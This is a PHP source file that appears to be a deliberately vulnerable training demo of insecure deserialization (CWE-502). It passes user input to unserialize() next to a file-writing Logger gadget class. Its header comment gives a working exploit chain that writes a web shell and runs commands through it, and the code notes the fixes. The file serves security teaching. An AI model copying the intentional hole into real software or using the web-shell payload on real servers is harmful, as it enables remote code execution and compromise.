<?php
/**
 * VULNERABLE: Insecure Deserialization (CWE-502)
 *
 * A base64-encoded, serialized PHP object is accepted from a cookie
 * and passed straight to unserialize(). If any class in the
 * autoload path has a __wakeup()/__destruct() "magic method" gadget,
 * this can lead to code execution, arbitrary file writes, etc.
 *
 * Try: build a serialized Logger object and pass it as ?data=...
 *   php -r "class Logger { public $logFile='pwned.php'; public $logData='<?php system(\$_GET[c]); ?>'; function __destruct(){ file_put_contents(\$this->logFile,\$this->logData);} } echo base64_encode(serialize(new Logger()));"
 *   Then: /deserialize.php?data=<paste the base64 output>
 *   Then: /pwned.php?c=id
 */

// A "gadget" class present in the app — this alone is enough,
// no framework needed, to demonstrate the risk.
class Logger {
    public $logFile = 'app.log';
    public $logData = '';

    public function __destruct() {
        // Runs automatically on unserialize + script end
        file_put_contents(__DIR__ . '/' . basename($this->logFile), $this->logData, FILE_APPEND);
    }
}

$message = '';
if (isset($_GET['data'])) {
    $raw = base64_decode($_GET['data']);
    // --- VULNERABLE LINE ---
    $obj = unserialize($raw);
    // FIX: never unserialize user input. Use JSON instead:
    //   $obj = json_decode($raw, true);
    // FIX (if you must): unserialize($raw, ['allowed_classes' => false]);
    $message = 'Deserialized: ' . gettype($obj);
}
?>
<!DOCTYPE html>
<html>
<head><title>Deserialization Demo</title></head>
<body>
<h2>Deserialization endpoint (vulnerable)</h2>
<form method="get">
    <input type="text" name="data" placeholder="base64 serialized payload" size="60">
    <button type="submit">Submit</button>
</form>
<p><?= htmlspecialchars($message) ?></p>
</body>
</html>
